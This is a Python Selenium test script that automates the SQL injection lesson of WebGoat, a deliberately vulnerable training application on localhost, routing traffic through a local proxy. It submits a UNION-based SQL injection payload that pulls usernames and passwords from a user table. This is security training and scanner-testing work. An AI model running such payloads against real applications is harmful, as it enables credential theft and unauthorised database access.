# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException
import unittest, time, re

class SqlInjection(unittest.TestCase):
    def setUp(self):
        profile = webdriver.FirefoxProfile()
        profile.set_preference('network.proxy_type', 1)
        profile.set_preference('network.proxy.http', "127.0.0.1")
        profile.set_preference('network.proxy.http_port', "8090")
        self.driver = webdriver.Firefox(profile)
        self.driver.implicitly_wait(30)
    
    def test_sql_injection(self):
        driver = self.driver
        driver.get("http://localhost:8080/WebGoat/login")
        driver.find_element_by_id("exampleInputEmail1").clear()
        driver.find_element_by_id("exampleInputEmail1").send_keys("testuser")
        driver.find_element_by_id("exampleInputPassword1").clear()
        driver.find_element_by_id("exampleInputPassword1").send_keys("testpw")
        driver.find_element_by_xpath("//button[@type='submit']").click()
        driver.find_element_by_link_text("(A1) Injection").click()
        driver.find_element_by_id("A1Injection-SQLInjectionadvanced").click()
        driver.find_element_by_xpath("//div[@id='lesson-page-controls']/div/div[2]/a[3]/div").click()
        driver.find_element_by_name("userid_6a").click()
        driver.find_element_by_name("userid_6a").clear()
        driver.find_element_by_name("userid_6a").send_keys("x' UNION SELECT 1,user_name,password,'','','',7 FROM user_system_data; --")
        driver.find_element_by_name("Get Account Info").click()
    
    def is_element_present(self, how, what):
        try: self.driver.find_element(by=how, value=what)
        except NoSuchElementException as e: return False
        return True
    
    def is_alert_present(self):
        try: self.driver.switch_to_alert()
        except NoAlertPresentException as e: return False
        return True
    
    def close_alert_and_get_its_text(self):
        try:
            alert = self.driver.switch_to_alert()
            alert_text = alert.text
            if self.accept_next_alert:
                alert.accept()
            else:
                alert.dismiss()
            return alert_text
        finally: self.accept_next_alert = True
    
    def tearDown(self):
        self.driver.quit()
        self.assertEqual([], self.verificationErrors)

if __name__ == "__main__":
    unittest.main()
